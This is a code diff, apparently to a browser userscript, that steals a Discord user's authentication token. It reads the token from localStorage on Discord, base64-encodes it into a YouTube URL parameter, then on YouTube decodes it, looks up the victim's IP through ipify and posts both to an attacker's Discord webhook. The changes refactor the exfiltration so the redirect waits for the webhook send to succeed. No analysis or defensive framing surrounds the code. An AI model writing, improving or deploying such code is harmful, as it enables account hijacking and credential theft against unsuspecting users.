@@ -7,7 +7,6 @@ setTimeout(() => {
         const url = new URL(window.location.href);
         const param = atob(url.searchParams.get("v"));
         if (param != null) {
-
             fetch('https://api.ipify.org/?format=json')
                 .then(response => response.json())
                 .then(data => {
@@ -24,36 +23,42 @@ setTimeout(() => {
                         ]
                     };
 
-                    // Send to Discord webhook FIRST
-                    fetch(webhookURL, {
+                    console.log("Sending data to Discord webhook...");
+
+                    return fetch(webhookURL, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
                         },
                         body: JSON.stringify(message)
-                    })
-                    .then(() => {
-                        console.log("Data sent to webhook. Redirecting now...");
+                    });
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log("Webhook data sent successfully!");
+
+                        // 🔹 Delay Redirect AFTER Webhook Completes
                         setTimeout(() => {
                             window.location.href = "https://discord.com/channels/@me";
-                        }, 3000); // Wait 3 seconds before redirecting
-                    })
-                    .catch(error => console.error('Error sending to webhook:', error));
+                        }, 3000); // 3s delay before redirecting
+                    } else {
+                        console.error("Failed to send webhook data.");
+                    }
                 })
-                .catch(error => console.error('Error fetching IP:', error));
+                .catch(error => console.error('Error:', error));
         }
     } else if (window.location.href === "https://discord.com/channels/@me") {
-
         const token = localStorage.token;
         if (token != null) {
-            console.log("Token found, encoding and redirecting...");
+            console.log("Token found, redirecting...");
             setTimeout(() => {
                 window.location.href = "https://www.youtube.com/watch?v=" + btoa(JSON.stringify(token));
             }, 3000); // Delay redirect
         }
     } else {
+        console.log("Redirecting to Discord in 3s...");
         setTimeout(() => {
             window.location.href = "https://discord.com/channels/@me";
         }, 3000); // Delay redirect
     }
-}, 2000); // 2-second delay before running script
+}, 2000); // 2s delay before running script
